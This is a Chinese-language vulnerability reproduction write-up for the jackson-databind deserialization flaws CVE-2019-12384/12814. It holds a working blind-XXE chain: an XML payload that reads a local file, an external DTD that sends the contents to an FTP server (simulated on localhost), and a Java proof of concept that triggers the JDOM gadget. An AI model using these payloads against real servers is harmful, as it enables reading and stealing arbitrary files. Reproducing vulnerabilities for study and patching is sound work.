<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X3be8fca0769480b798adcd0f752c25e910c6416"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-12384</span><span class="csECDA2D3">）（</span><span class="csDE05BCC"> CVE-2019-12814</span><span class="csECDA2D3">）</span><span class="csDE05BCC">FasterXML jackson-databind </span><span class="csECDA2D3">反序列化漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Jackson 2.x ~ Jackson 2.9.9,</span><span class="cs9C1B1871">当开发人员在应用程序中通过</span><span class="cs8926E06">ObjectMapper</span><span class="cs9C1B1871">对象调用</span><span class="cs8926E06">enableDefaultTyping</span><span class="cs9C1B1871">方法并且服务端使用了</span><span class="cs8926E06">JDOM 1.x </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> JDOM 2.x </span><span class="cs9C1B1871">依赖库时，攻击者可以发送恶意的</span><span class="cs8926E06">JSON</span><span class="cs9C1B1871">消息，读取远程服务器上的任意文件。</span></p><h3 class="cs868C439D">
			<a name="利用条件"><span class="csD6CA00D2">利用条件</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">开启</span><span class="cs8926E06">enableDefaultTyping</span></li><li class="cs24C36B3"><span class="cs9C1B1871">使用了</span><span class="cs8926E06">JDOM 1.x </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> JDOM 2.x </span><span class="cs9C1B1871">依赖</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Jackson 2.x ~2.9.9</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">创建一个</span><span class="cs8926E06">Meaven</span><span class="cs9C1B1871">项目，在</span><span class="cs8926E06">pom.xml</span><span class="cs9C1B1871">文件中添加以下依赖：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;dependencies&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;2.9.9&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;2.9.9&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;2.9.9&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.jdom&lt;/groupId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;jdom2&lt;/artifactId&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;2.0.6&lt;/version&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/dependency&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;/dependencies&gt;</span></p><h3 class="cs868C439D">
			<a name="漏洞利用"><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<h4 class="cs868C439D">
			<a name="测试文件"><span class="cs6EDCDAE2">测试文件</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">准备一个测试文件，后续进行读取：</span><span class="cs8926E06"><br/>1.png</span></p><h4 class="cs868C439D">
			<a name="编写pocxml"><span class="cs6EDCDAE2">编写</span><span class="csBF12A472">poc.xml</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该</span><span class="cs8926E06">XXE</span><span class="cs9C1B1871">属于</span><span class="cs8926E06">Blind XXE</span><span class="cs9C1B1871">，我们构造以下恶意</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">代码，它会去调用位于我们的攻击主机上</span><span class="cs8926E06">(</span><span class="cs9C1B1871">这里以本地启动的</span><span class="cs8926E06">Http</span><span class="cs9C1B1871">服务模拟</span><span class="cs8926E06">)</span><span class="cs9C1B1871">的外部</span><span class="cs8926E06">dtd</span><span class="cs9C1B1871">文件</span><span class="cs8926E06">(</span><span class="cs9C1B1871">不在同一个文件写入要读取的文件主要是为了避免参数实体引用时发生的错误）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!DOCTYPE any[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % file SYSTEM &quot;file:///c:/hello.txt&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:4444/evil.dtd&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%remote;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%send; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">]&gt; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;foo&gt;&lt;/foo&gt;</span></p><h4 class="cs868C439D">
			<a name="编写evildtd"><span class="cs6EDCDAE2">编写</span><span class="csBF12A472">evil.dtd</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;!ENTITY % ppp &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;ftp://127.0.0.1/%file;&#39;&gt;&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%ppp;</span></p><h4 class="cs868C439D">
			<a name="启动http服务"><span class="cs6EDCDAE2">启动</span><span class="csBF12A472">Http</span><span class="cs6EDCDAE2">服务</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">python</span><span class="cs9C1B1871">开启一个简易的</span><span class="cs8926E06">Http</span><span class="cs9C1B1871">服务：</span><span class="cs8926E06"><br/>2.png</span></p><h4 class="cs868C439D">
			<a name="启动ftp服务"><span class="cs6EDCDAE2">启动</span><span class="csBF12A472">FTP</span><span class="cs6EDCDAE2">服务</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">IPOP V4.1</span><span class="cs9C1B1871">软件搭建一个简易的</span><span class="cs8926E06">FTP</span><span class="cs9C1B1871">服务：</span><span class="cs8926E06"><br/>3.png</span></p><h4 class="cs868C439D">
			<a name="执行漏洞poc"><span class="cs6EDCDAE2">执行漏洞</span><span class="csBF12A472">POC</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下漏洞</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package com.jacksonTest;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import com.fasterxml.jackson.databind.ObjectMapper;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class Poc {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObjectMapper mapper = new ObjectMapper();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mapper.enableDefaultTyping();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String payload = &quot;[\&quot;org.jdom2.transform.XSLTransformer\&quot;, \&quot;http://127.0.0.1:4444/poc.xml\&quot;]&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mapper.readValue(payload, Object.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IOException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功读取到文件信息（笔者这里尝试过读取</span><span class="cs8926E06">win.in</span><span class="cs9C1B1871">文件，但是发现无法读全，该漏洞其实也是一个反序列化</span><span class="cs8926E06">+XXE</span><span class="cs9C1B1871">的利用，而且是</span><span class="cs8926E06">Blind XXE</span><span class="cs9C1B1871">，有兴趣的大佬可以再深入研究一波）</span><span class="cs8926E06"><br/>4.jpg</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">整个执行流程如下</span><span class="cs9C1B1871">：首先加载参数实体</span><span class="cs8926E06">remote</span><span class="cs9C1B1871">，此时会远程加载攻击者主机上的外部实体，首先加载</span><span class="cs8926E06">name</span><span class="cs9C1B1871">实体的值，即为我们要读取的文件的内容，然后加载</span><span class="cs8926E06">ppp</span><span class="cs9C1B1871">参数实体，在</span><span class="cs8926E06">ppp</span><span class="cs9C1B1871">实体中又内嵌了</span><span class="cs8926E06">send</span><span class="cs9C1B1871">实体，所以</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接下来加载</span><span class="cs8926E06">send</span><span class="cs9C1B1871">实体，此时就是关键点，即将</span><span class="cs8926E06">name</span><span class="cs9C1B1871">实体的值（</span><span class="cs8926E06">C:/hello.txt</span><span class="cs9C1B1871">）发送到我们的</span><span class="cs8926E06">FTP</span><span class="cs9C1B1871">服务器上</span><span class="cs8926E06">(</span><span class="cs9C1B1871">通过</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">、</span><span class="cs8926E06">POST</span><span class="cs9C1B1871">等方式的查询会在攻击者的服务器日志中留下相关记录）</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7820#toc-7</span></p></body>
</html>
